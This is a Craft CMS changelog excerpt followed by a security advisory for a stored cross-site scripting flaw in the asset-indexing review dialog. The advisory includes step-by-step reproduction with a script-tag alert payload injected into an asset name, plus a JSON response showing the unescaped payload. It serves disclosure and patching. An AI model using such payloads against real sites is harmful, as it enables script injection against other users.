* Improved the control panel styling when the Debug Toolbar is enabled.
* The image transformer now verifies that transforms don’t exist if the index record is missing, before queuing up the transform generation, for local filesystems. ([#13052](https://github.com/craftcms/cms/issues/13052))
* Added the `--propagate-to` and `--set-enabled-for-site` options to the `resave/entries` command.
* Craft’s bootstrap script now defines a `CRAFT_ENVIRONMENT` environment variable, as a safety measure for plugins that may be checking for it rather than `Craft::$app->env`.
* Added `craft\helpers\ElementHelper::siteStatusesForElement()`.
* `craft\elements\Asset::EVENT_BEFORE_DEFINE_URL` now sends a `craft\events\DefineAssetUrlEvent` object, rather than `craft\events\DefineUrlEvent`. ([#13018](https://github.com/craftcms/cms/issues/13018))
* `craft\web\View::renderObjectTemplate()` now trims the returned template output.
* Fixed a bug where users were “View other users’ drafts” section permissions weren’t being enforced for unpublished drafts.
* Fixed a bug where Matrix fields weren’t counting disabled blocks when enforcing their Min Blocks settings. ([#13059](https://github.com/craftcms/cms/issues/13059))
* Fixed a bug where volume folder modals’ sidebars and content were being cut off. ([#13074](https://github.com/craftcms/cms/issues/13074))
* Fixed a bug where element editors were showing provisional changes, even if the user didn’t have permission to save them.
* Fixed a bug where the control panel could be inaccessible if a mutex lock couldn’t be acquired for the queue. ([#13052](https://github.com/craftcms/cms/issues/13052))
* Fixed a bug where it wasn’t possible to update a Matrix block on a revision without a new block ID being assigned. ([#13064](https://github.com/craftcms/cms/discussions/13064))
* Fixed a JavaScript error that could occur on field layout designers, if any tabs didn’t have any elements. ([#13062](https://github.com/craftcms/cms/issues/13062))
* Fixed a bug where selecting an image with a transform within an asset selector modal wasn’t ever resolving.
* Fixed a PHP error that could occur if there was a problem sending a password-reset email. ([#13070](https://github.com/craftcms/cms/pull/13070))
* Fixed a bug where users’ User Groups and Permissions settings were getting cleared in the UI when sending an activation email, if the email failed to send. ([#13061](https://github.com/craftcms/cms/issues/13061))
* Fixed XSS vulnerabilities.
* Updated yii2-debug to 2.1.22. ([#13058](https://github.com/craftcms/cms/issues/13058))

May 25, 2023

## Package

craftcms/cms
(Craft CMS)

## Affected versions

>= 4.0.0-RC1, <= 4.4.6

## Patched versions

4.4.7

## Description

### Summary

XSS can be triggered by review volumes

### PoC

```
1. Access setting tab
2. Create new assets
3. In assets name inject payload: "<script>alert(1337)</script>
4. Click Utilities tab
5. Choose all volumes, or volume trigger xss
6. Click Update asset indexes.
7. Wait to assets update success.
8. Progress complete.
9. Click on review button will trigger XSS

```
### Root cause

Function: index.php?p=admin/actions/asset-indexes/process-indexing-session&v=1680710595770

After loading completed, progess will load:

"skippedEntries"

and

"missingEntries"

These parameters is not yet filtered, I just tried "skippedEntries" but I think it will be work with "missingEntries"

### My reponse:

{

"session": {

"id": 10,

"indexedVolumes": {

"6": ""<script>alert(1337)</script>"

},

"totalEntries": 2235,

"processedEntries": 2235,

"cacheRemoteImages": true,

"listEmptyFolders": false,

"isCli": false,

"actionRequired": true,

"dateCreated": "Apr 5, 2023, 9:03:16 AM",

"skippedEntries": [

""<script>alert(1337)</script>/assetpreviews/Image.php",

""<script>alert(1337)</script>/assetpreviews/Pdf.php"

],

"missingEntries": {

"folders": [],

"files": []

},

"processIfRootEmpty": false

},

"skipDialog": false

}

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
